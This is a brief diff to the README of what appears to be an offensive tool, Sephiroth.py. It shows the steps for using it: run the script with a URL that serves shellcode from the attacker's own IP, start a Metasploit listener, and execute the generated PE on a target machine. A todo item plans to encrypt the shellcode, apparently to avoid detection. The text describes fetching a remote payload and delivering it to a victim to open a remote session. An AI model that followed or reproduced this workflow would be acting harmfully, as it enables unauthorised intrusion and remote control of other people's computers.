@@ -24,6 +24,10 @@ then:
 
 python Sephiroth.py -url http://yourip/shellcode
 
+start metasploit listener
+
+execute PE on target machine
+
 todo
 --------
 asymetric encryption to the shellcode
